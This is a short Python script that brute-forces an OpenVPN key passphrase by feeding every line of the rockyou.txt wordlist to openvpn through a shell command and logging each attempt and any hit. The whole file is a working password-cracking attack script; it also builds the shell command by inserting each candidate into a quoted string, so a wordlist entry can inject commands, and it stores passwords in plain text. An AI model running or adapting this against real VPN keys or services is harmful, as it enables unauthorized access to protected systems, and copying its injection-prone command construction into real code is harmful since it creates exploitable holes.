import subprocess
import os
import logging

# Set up logging to output to both the console and a log file
logging.basicConfig(filename='output.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Function to try a password for OpenVPN
def try_password(password):
    # Log the current password being tested
    logging.info(f"Trying password: {password}")
    
    # Command to use OpenVPN with a key password instead of a user password
    command = f"echo '{password}' > keypass.txt && openvpn --config client.conf --askpass keypass.txt"
    try:
        # Capture both stdout and stderr
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=5)
        output = result.decode("utf-8")
        
        # Log the output of the successful command
        logging.info(f"Command output:\n{output}")
        
        return True
    except subprocess.CalledProcessError as e:
        # Log the error output if the command fails
        logging.error(f"Command failed with output:\n{e.output.decode('utf-8')}")
        return False

# Function to brute force OpenVPN using a list of passwords
def brute_force_openvpn(password_list):
    for password in password_list:
        if try_password(password.strip()):
            logging.info(f"Password found: {password}")
            return
    logging.info("Password not found.")

# Use the specified file path
file_path = "/Users/nednik/wordlists/rockyou.txt"

# Read passwords from the file using latin-1 encoding
with open(file_path, "r", encoding="latin-1") as file:
    password_list = file.readlines()

# Start the brute force process
brute_force_openvpn(password_list)
